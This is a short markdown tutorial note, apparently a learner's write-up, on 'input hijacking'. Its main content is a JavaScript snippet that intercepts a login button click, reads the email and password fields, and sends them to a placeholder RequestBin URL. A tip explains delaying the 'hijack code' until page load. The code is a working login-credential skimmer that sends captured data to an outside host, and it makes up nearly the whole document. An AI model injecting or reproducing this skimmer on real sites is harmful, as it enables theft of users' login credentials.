# Input Hijacking & Live Data Capture

## Lessoons learnt
> - How to grab user input in real-time using DOM
> - How to listen for `onclick` or `onsubmit` events
> - Sending data to my own server (RequestBin)
------

## Real-Time Input Capture Script
```js
document.getElementById("loginBtn").onclick = function(event) {
  event.preventDefault();

  let email = document.getElementById("email").value;
  let pass = document.getElementById("password").value;

  fetch("https://YOUR-REQUESTBIN.x.pipedream.net?email=" + email + "&pass=" + pass);
};
```
## Tip
If the button or form doesn't exist yet when my script runs, use:
```js
window.onload = function() {
  // Your hijack code here
}
```
